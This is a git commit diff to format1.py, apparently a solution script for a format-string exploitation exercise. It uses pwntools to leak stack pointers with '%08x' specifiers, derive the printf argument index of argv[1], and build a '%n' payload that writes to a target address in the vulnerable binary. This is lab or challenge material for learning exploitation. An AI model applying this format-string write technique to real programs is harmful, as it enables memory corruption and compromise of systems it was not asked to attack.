5212d9773299ce719fd243e86926be84daacd948
Clément Bœsch <u@pkh.me>
2019-12-29 15:19:15 +0100

    format1: probe only once, simplify

--- format1.py
+++ format1.py
@@ -46,40 +46,39 @@ log.info('target_addr: %08x', target_addr)
 
 # Always use the same arg length to keep a consistent stack pointer between runs
 def get_fixed_len_fmt(fmt):
-    PAD = 15  # arbitrary, long to always fit everything
+    PAD = 55  # arbitrary, long to always fit everything, increase if necessary
     return fit({0: fmt + '.', PAD: '\n'})
 
 
-# off is relative to sp_vuln
-def leak_ptr_at(idx):
-    fmt = get_fixed_len_fmt('%' + str(idx) + '$08x')
+def leak_stack_ptrs(count):
+    fmt = get_fixed_len_fmt(' '.join('%08x' for i in range(count)))
     with s.system([args.BIN, fmt]) as p:
-        return int(p.recv()[:8], 16)
+        return [None] + [int(x[:8], 16) for x in p.recv().split(' ')]  # None is $0
 
 
-# Leak the first accessible hint about the stack address
-bp_main = leak_ptr_at(6)
-log.info('bp_main: %08x', bp_main)
+# Identify 2 key pointers
+ptrs = leak_stack_ptrs(9)
+bp_main, argv1 = ptrs[6], ptrs[8]
 
-# Stack pointer reference to use to derivate format printf argument indices
+# Deduce from bp_main the stack pointer reference to use to derivate format
+# printf index of argv[1]
 sp_vuln = (bp_main & ~0xf) - 0x10 - 4 - 4 - 0x18
-log.info('sp_vuln: %08x', sp_vuln)
-
-# Identify fmt address pushed by vuln's parent
-argv1 = leak_ptr_at(8)
-argv1_off = argv1 - sp_vuln
-log.info('argv1: %08x (+%d)', argv1, argv1_off)
 
 # We might miss the start of the string due to a 32-bit misalign (arg indices
 # assume 32-bit steps), so we need to offset our target address and adjust the
 # index
+argv1_off = argv1 - sp_vuln
 argv1_idx = argv1_off >> 2
 missby = argv1_off - argv1_idx * 4
 padding = 4 - missby
 n_idx = argv1_idx + 1
+
+log.info('sp_vuln: %08x', sp_vuln)
+log.info('bp_main: %08x (+%d)', bp_main, bp_main - sp_vuln)
+log.info('argv1:   %08x (+%d)', argv1, argv1_off)
 log.info('missby:  %dB', missby)
 log.info('padding: %dB', padding)
-log.info('n_idx: %d', n_idx)
+log.info('n_idx:   %d', n_idx)
 
 payload = cyclic(padding) + p32(target_addr) + '%' + str(n_idx) + '$n'
 fmt = get_fixed_len_fmt(payload)
